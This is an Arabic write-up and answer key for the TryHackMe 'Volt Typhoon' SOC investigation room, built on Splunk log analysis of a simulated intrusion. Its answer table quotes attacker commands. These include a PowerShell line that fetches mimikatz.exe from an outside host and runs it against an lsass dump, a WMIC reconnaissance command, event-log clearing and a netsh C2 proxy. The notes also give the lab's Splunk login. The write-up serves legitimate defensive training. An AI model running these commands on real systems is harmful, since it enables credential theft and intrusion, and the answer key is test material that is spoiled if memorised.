# حل غرفة TryHackMe: Volt Typhoon

**رابط الغرفة:** [TryHackMe — Volt Typhoon](https://tryhackme.com/room/volttyphoon)  
**المسار:** SOC Level 2 → SOC Level 2 Capstone Challenges  
**حالة الإكمال:** **Room completed!**  
**المهام المكتملة:** `9`  
**النقاط:** `450`  
**المختبر المستخدم:** `Volt Typhoon v6-badr` — `10.49.128.168`

تم إدخال جميع الإجابات والتحقق منها داخل TryHackMe، وظهرت لكل إجابة حالة **Correct Answer**، ثم ظهرت صفحة الإكمال الرسمية للغرفة.

## ملخص التحقيق

تتبعت الغرفة سلسلة اختراق من الوصول الأولي عبر سجلات Zoho ManageEngine ADSelfService Plus، مروراً بتنفيذ أوامر WMIC ونسخ قاعدة بيانات Active Directory، ثم إنشاء web shell للاستمرارية. بعد ذلك غطّى المهاجم آثاره عبر حذف سجل RDP وإعادة تسمية أرشيف قاعدة البيانات، وفحص مؤشرات البيئة الافتراضية، والبحث عن بيانات اعتماد، ثم تحرك أفقياً ونسخ web shell إلى خادم آخر. في المرحلة الأخيرة جُمعت ملفات مالية، وأُنشئ proxy لقناة C2، ومُسحت سجلات أحداث Windows.[1] [2]

تعكس هذه الأنشطة استخدام أدوات Windows المشروعة بأسلوب **Living off the Land**، وهو نمط يرتبط بعمليات Volt Typhoon الموثقة واعتمادها على أدوات مثل PowerShell وWMIC وntdsutil وnetsh.[3]

## الإجابات المؤكدة

| المهمة | السؤال المختصر | الإجابة |
|---|---|---|
| Task 1 — IR Scenario | تأكيد المسؤوليات وبدء المختبر | `No answer needed` |
| Task 2 — Initial Access 1 | وقت تغيير كلمة مرور Dean بصيغة ISO 8601 | `2024-03-24T11:10:22` |
| Task 2 — Initial Access 2 | اسم الحساب الإداري الجديد | `voltyp-admin` |
| Task 3 — Execution 1 | أمر WMIC لجمع معلومات الأقراص من server01 وserver02 | `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename` |
| Task 3 — Execution 2 | كلمة مرور أرشيف نسخة قاعدة AD | `d5ag0nm@5t3r` |
| Task 4 — Persistence | مجلد وضع web shell | `C:\Windows\Temp\` |
| Task 5 — Defense Evasion 1 | PowerShell cmdlet لحذف سجل Most Recently Used | `Remove-ItemProperty` |
| Task 5 — Defense Evasion 2 | اسم الملف بعد إعادة تسمية الأرشيف وتغيير امتداده | `cl64.gif` |
| Task 5 — Defense Evasion 3 | مسار Registry لفحص البيئة الافتراضية | `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control` |
| Task 6 — Credential Access 1 | البرامج الثلاثة التي فحصها المهاجم بوساطة reg query | `OpenSSH, putty, realvnc` |
| Task 6 — Credential Access 2 | الأمر الكامل المفكوك لتنزيل وتشغيل Mimikatz | `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait` |
| Task 7 — Discovery & Lateral Movement 1 | Event IDs التي بحث عنها المهاجم باستخدام wevtutil | `4624 4625 4769` |
| Task 7 — Discovery & Lateral Movement 2 | اسم web shell الجديد على server-02 | `AuditReport.jspx` |
| Task 8 — Collection | الملفات المالية الثلاثة المنسوخة | `2022.csv 2023.csv 2024.csv` |
| Task 9 — C2 & Cleanup 1 | عنوان الاتصال والمنفذ في proxy | `10.2.30.1 8443` |
| Task 9 — C2 & Cleanup 2 | أنواع سجلات الأحداث التي مسحها المهاجم | `Application Security Setup System` |

## ملاحظات تقنية

كان عنوان Splunk المعروض في الغرفة هو `http://10.49.128.168:8000`، مع بيانات الدخول التدريبية `volthunter` و`voltyp1010`. استُخدمت سجلات Splunk وحقول الأوامر ومصادر السجلات المرتبطة بالمهام للوصول إلى النتائج، ثم جرى التحقق من كل إجابة في واجهة TryHackMe.

تشير إجابة Task 7 إلى أن المهاجم بحث عن أحداث تسجيل الدخول الناجح والفاشل وطلبات Kerberos Service Ticket عبر الأرقام `4624` و`4625` و`4769`. أما إجابة Task 9 فتوضح استخدام `netsh` لإنشاء proxy نحو `10.2.30.1:8443`، مع مسح سجلات **Application** و**Security** و**Setup** و**System`.

## المراجع

[1]: https://tryhackme.com/room/volttyphoon "TryHackMe — Volt Typhoon"

[2]: https://github.com/Paulus1337/Volt-Typhoon-Write-up "Paulus1337 — Volt Typhoon Write-up"

[3]: https://attack.mitre.org/groups/G1017/ "MITRE ATT&CK — Volt Typhoon (G1017)"
